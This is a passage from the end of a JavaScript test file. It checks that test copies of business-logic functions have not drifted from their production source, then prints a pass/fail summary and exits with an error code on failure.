            if (!fromSource) throw new Error(`${fnName} not found in ${relPath} — was it renamed or removed?`);
            if (!fromTest)   throw new Error(`${fnName} not found in this test file`);

            if (normalise(fromSource) !== normalise(fromTest)) {
                throw new Error(
                    `${fnName} has drifted from ${relPath}.\n` +
                    `      The tests above are therefore testing code that is no longer in production.\n` +
                    `      Re-sync the copy in js/tests/business-logic.test.js with the source.\n` +
                    `      --- ${relPath} ---\n      ${normalise(fromSource)}\n` +
                    `      --- test copy ---\n      ${normalise(fromTest)}`
                );
            }
        });
    }
});

// ---- Summary ----
console.log(`\n  Results: ${_passed} passed, ${_failed} failed\n`);
if (_failed > 0) process.exitCode = 1;
if (_failed > 0) process.exit(1);
